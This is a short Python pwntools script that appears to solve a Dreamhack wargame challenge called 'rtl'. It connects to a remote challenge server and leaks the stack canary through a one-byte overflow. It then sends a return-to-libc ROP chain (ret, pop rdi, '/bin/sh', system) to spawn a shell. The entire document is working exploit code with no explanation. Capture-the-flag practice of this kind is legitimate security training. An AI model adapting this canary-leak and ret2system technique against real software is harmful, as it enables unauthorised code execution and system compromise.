
from pwn import *
#p = process('./rtl')
p = remote('host3.dreamhack.games', 13389)
e = ELF('./rtl')
r = ROP(e)
system = e.plt['system']
pop_rdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]

binsh = next(e.search(b"/bin/sh"))

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
print(hex(canary))
payload = b'a'*0x38 + p64(canary) + b'b' * 0x8 + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system)

p.sendlineafter(b'Buf: ', payload)
p.interactive()
